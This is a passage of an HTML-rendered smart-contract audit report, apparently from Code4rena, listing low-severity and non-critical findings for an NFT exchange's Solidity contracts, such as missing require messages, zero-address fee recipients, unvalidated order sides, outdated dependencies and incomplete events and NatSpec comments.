class=\"mtk1\">\t </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">291</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">order</span><span class=\"mtk1\">.</span><span class=\"mtk12\">trader</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">573</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">remainingETH</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">price</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">45</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] &gt;= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">48</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">success</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">71</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">from</span><span class=\"mtk1\">] &gt;= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">72</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<h3 id=\"description-1\" style=\"position:relative;\"><a href=\"#description-1\" aria-label=\"description 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>The correct and clear error description explains to the user why the function reverts, but the error descriptions below in the project are not self-explanatory. These error descriptions are very important in the debug features of DApps like Tenderly. Error definitions should be added to the require block, not exceeding 32 bytes.</p>\n<h2 id=\"l-09-fee-recipient-may-be-address0\" style=\"position:relative;\"><a href=\"#l-09-fee-recipient-may-be-address0\" aria-label=\"l 09 fee recipient may be address0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-09] Fee recipient may be address(0)</h2>\n<h3 id=\"context-1\" style=\"position:relative;\"><a href=\"#context-1\" aria-label=\"context 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Context</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">600</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_transferTo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fees</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"description-2\" style=\"position:relative;\"><a href=\"#description-2\" aria-label=\"description 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>The recipient of a fee may be address(0), leading to lost ETH.</p>\n<h2 id=\"l-10-exchangesol--_execute-buyorderside-not-validated\" style=\"position:relative;\"><a href=\"#l-10-exchangesol--_execute-buyorderside-not-validated\" aria-label=\"l 10 exchangesol  _execute buyorderside not validated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-10] Exchange.sol  <code>_execute</code> buy.order.side not validated</h2>\n<p>In <code>Exchhange.execute</code> , it is not validated that <code>buy.order.side == Side.Buy</code> (only the sell side is validated). With the current system, all policies ensure that, but it would also make sense to validate it in execute IMO. Future policies may not validate that and such a basic check should also not be the responsibility of a policy in my opinion.</p>\n<h2 id=\"n-01-not-using-the-latest-version-of-openzeppelin-from-dependencies\" style=\"position:relative;\"><a href=\"#n-01-not-using-the-latest-version-of-openzeppelin-from-dependencies\" aria-label=\"n 01 not using the latest version of openzeppelin from dependencies permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] Not using the latest version of OpenZeppelin from dependencies</h2>\n<p>The package.json configuration file says that the project is using 4.6.0 of OpenZeppelin which has a not last update version</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">package</span><span class=\"mtk1\">.</span><span class=\"mtk12\">json</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">61</span><span class=\"mtk1\">:     </span><span class=\"mtk8\">&quot;@openzeppelin/contracts&quot;</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&quot;4.4.1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">62</span><span class=\"mtk1\">:     </span><span class=\"mtk8\">&quot;@openzeppelin/contracts-upgradeable&quot;</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&quot;^4.6.0&quot;</span><span class=\"mtk1\">,</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use patched versions</p>\n<h2 id=\"n-02-no-same-value-input-control\" style=\"position:relative;\"><a href=\"#n-02-no-same-value-input-control\" aria-label=\"n 02 no same value input control permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] No same value input control</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">340</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">341</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setOracle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_oracle</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t342:         </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t343:         </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t344:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">345</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_oracle</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Address cannot be zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">346</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_oracle</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">347</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NewOracle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">348</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add code like this;\n<code>if (oracle == _oracle revert ADDRESS_SAME();</code></p>\n<h2 id=\"n-03-0-address-check\" style=\"position:relative;\"><a href=\"#n-03-0-address-check\" aria-label=\"n 03 0 address check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] <code>0 address</code> check</h2>\n<p>0 address control should be done in these parts;</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L130\">Exchange.sol#L130</a></p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add code like this;<br>\n<code>if (oracle == address(0)) revert ADDRESS_ZERO();</code></p>\n<h2 id=\"n-04-omissions-in-events\" style=\"position:relative;\"><a href=\"#n-04-omissions-in-events\" aria-label=\"n 04 omissions in events permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-04] Omissions in Events</h2>\n<p>Throughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, some events are missing important parameters</p>\n<p>The events should include the new value and old value where possible:</p>\n<p>Events with no old value;</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L329\">https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L329</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L338\">https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L338</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L347\">https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L347</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L355\">https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L355</a><br></p>\n<h2 id=\"nc-05-add-parameter-to-event-emit\" style=\"position:relative;\"><a href=\"#nc-05-add-parameter-to-event-emit\" aria-label=\"nc 05 add parameter to event emit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[NC-05] Add parameter to Event-Emit</h2>\n<p>Some event-emit description hasn’t parameter. Add to parameter  for front-end website or client app , they can has that something has happened on the blockchain.</p>\n<p>Events with no old value;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t </span><span class=\"mtk7\">58</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Opened</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t </span><span class=\"mtk7\">62</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Closed</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<h2 id=\"n-06-include-return-parameters-in-natspec-comments\" style=\"position:relative;\"><a href=\"#n-06-include-return-parameters-in-natspec-comments\" aria-label=\"n 06 include return parameters in natspec comments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-06] Include <code>return parameters</code> in <em>NatSpec comments</em></h2>\n<h3 id=\"context-2\" style=\"position:relative;\"><a href=\"#context-2\" aria-label=\"context 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Context</h3>\n<p>All Contracts</p>\n<p><a href=\"https://docs.soliditylang.org/en/v0.8.15/natspec-format.html\">https://docs.soliditylang.org/en/v0.8.15/natspec-format.html</a></p>\n<p>If Return parameters are declared, you must prefix them with ”/// @return”.</p>\n<p>Some code analysis programs do analysis by reading NatSpec details, if they can’t see the “@return” tag, they do incomplete analysis.</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Include return parameters in NatSpec comments</p>\n<p>Recommendation Code Style:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">/// @notice information about what a function does</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">/// @param pageId The id of the page to get the URI for.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">/// @return Returns a page&#39;s URI if it has been minted </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pageId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">pageId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">pageId</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">currentId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;NOT_MINTED&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">string</span><span class=\"mtk1\">.</span><span class=\"mtk11\">concat</span><span class=\"mtk1\">(</span><span 